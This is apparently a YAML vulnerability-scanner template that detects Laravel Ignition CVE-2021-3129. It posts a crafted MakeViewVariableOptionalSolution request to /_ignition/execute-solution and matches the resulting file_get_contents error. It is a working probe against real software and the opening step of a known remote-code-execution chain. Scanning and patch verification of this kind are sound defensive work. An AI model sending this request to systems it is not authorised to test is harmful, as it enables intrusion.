detail:
  author: Jarcis-cy(https://github.com/Jarcis-cy)
  links:
  - https://github.com/vulhub/vulhub/blob/master/laravel/CVE-2021-3129
expression: r0()
manual: true
name: poc-yaml-laravel-cve-2021-3129
rules:
  r0:
    expression: 'response.status == 500 && response.body.bcontains(bytes("file_get_contents("
      + string(r) + ")")) && response.body.bcontains(bytes("failed to open stream"))

      '
    request:
      body: "{\n        \"solution\": \"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\"\
        ,\n        \"parameters\": {\n          \"variableName\": \"username\",\n\
        \          \"viewFile\": \"{{r}}\"\n        }\n}"
      cache: true
      follow_redirects: true
      headers:
        Content-Type: application/json
      method: POST
      path: /_ignition/execute-solution
set:
  r: randomLowercase(12)
transport: http
